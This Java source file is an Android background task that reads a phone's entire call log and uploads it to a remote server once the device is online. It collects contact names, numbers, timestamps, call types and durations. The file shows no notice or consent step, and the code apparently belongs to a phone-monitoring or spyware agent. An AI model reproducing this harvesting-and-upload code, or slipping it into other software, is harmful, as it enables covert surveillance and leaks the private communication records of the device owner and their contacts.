package com.inet.android.list;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * ListCall class is designed to get the list of call
 * 
 * @author johny homicide
 * 
 */
public class CallList extends AsyncTask<Context, Void, Void> {
	private Context mContext;
	private String LOG_TAG = CallList.class.getSimpleName().toString();
	private String complete;
	private int version;
	
	private String readCallLogs() {
		
		String sendStr = null;
		int type = -1;
		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CALL, mContext);
		Logging.doLog(LOG_TAG, "readCall" + version, "readCall" + version);

		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
			
			Cursor callLogCursor = null;
			// Делаем запрос к контент-провайдеру
			// и получаем все данные из таблицы

			complete = "0";
			callLogCursor = mContext.getContentResolver().query(
					android.provider.CallLog.Calls.CONTENT_URI, null, null,
					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);

			if (callLogCursor != null) {
				RequestParams params = new RequestParams();
				// Проходим в цикле, пока не дойдём до последней записи

				while (callLogCursor.moveToNext()) {

					// Имя контакта
					String name = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NAME));

					String cacheNumber = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
					// Номер контакта и т.д.
					String number = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.NUMBER));
					// String name = getNumber.getContactName(callLogCursor
					// .getString(callLogCursor
					// .getColumnIndex("address")))
					long dateTimeMillis = callLogCursor.getLong(callLogCursor
							.getColumnIndex(CallLog.Calls.DATE));
					// long durationMillis = callLogCursor.getLong(callLogCursor
					// .getColumnIndex(CallLog.Calls.DURATION));
					int callType = callLogCursor.getInt(callLogCursor
							.getColumnIndex(CallLog.Calls.TYPE));
					int durationInt = callLogCursor
							.getColumnIndex(CallLog.Calls.DURATION);
					String duration = callLogCursor.getString(durationInt);

					String dateString = ConvertDate.getDate(dateTimeMillis);

					if (cacheNumber == null)
						cacheNumber = number;
					if (name == null)
						name = "No Name";
					if (callType == CallLog.Calls.OUTGOING_TYPE) {
						type = AppConstants.TYPE_OUTGOING_CALL_REQUEST;
					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
						type = AppConstants.TYPE_INCOMING_CALL_REQUEST;
					} else if (callType == CallLog.Calls.MISSED_TYPE) {
						type = AppConstants.TYPE_MISSED_CALL_REQUEST;
					}
					params.put("data[][info][time]", dateString);
					params.put("data[][info][type]", Integer.toString(type));
					params.put("data[][info][number]", number);
					params.put("data[][info][name]", name);
					if (type == 3)
							params.put("data[][info][duration]", duration);
//						if (sendStr == null)
//							sendStr = archiveCallJson.toString();
//						else
//							sendStr += "," + archiveCallJson.toString();

					
//					if (sendStr.length() >= 50000) {
//
//						Logging.doLog(LOG_TAG, "str >= 50000", "str >= 50000");
//						sendRequest(sendStr, complete);
//						sendStr = null;
//					}
				}
//				if (sendStr != null) {
					setLastRaw(params);
					sendStr = null;
//				} else {
//					lastRaw("");
//					sendStr = null;
//				}
				Logging.doLog(LOG_TAG, "callLogCursor.close()",
						"callLogCursor.close()");
				callLogCursor.close();
			} else {
				Logging.doLog(LOG_TAG, "callLogCursor == null",
						"callLogCursor == null");
//				setLastRaw("");
				sendStr = null;
			}
		} else {
			endList();
			sendStr = null;
		}
		return null;
	}

	private void endList() {
		Logging.doLog(LOG_TAG, "endList " , "endList "  + version);	
		Queue.setList(AppConstants.TYPE_LIST_CALL, version, "0", mContext);
	}

	private void setLastRaw(RequestParams params) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 .." + version, "Send complete 1 .." + version);
		RequestList.sendDemandRequest(params, AppConstants.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
	}

	private void sendRequest(String str, String complete) {
		RequestList.sendDemandRequest(str, AppConstants.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
